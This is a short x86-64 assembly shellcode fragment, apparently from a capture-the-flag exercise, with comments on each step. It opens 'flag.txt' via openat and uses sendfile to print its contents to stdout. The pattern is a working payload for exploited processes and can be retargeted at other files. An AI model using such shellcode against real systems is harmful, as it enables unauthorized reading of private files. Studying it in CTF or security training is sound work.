xor rdx, rdx                   ; string terminator for "flag.txt"
push rdx
mov rsi, 0x7478742E67616C66    ; "flag.txt" in reverse due to little-endian
push rsi
mov rsi, rsp                   ; set filename address to stack's address
mov rax, 257                   ; so that sys_openat will be called later
mov rdi, -100                  ; set dfd to AT_FDCWD
syscall
mov rsi, rax                   ; set fd to openat()'s result which is flag.txt's fd
mov rax, 40                    ; so that sys_sendfile will be called later
mov rdi, 1                     ; send file's content to stdout
mov r10, 100                   ; set content length to read
syscall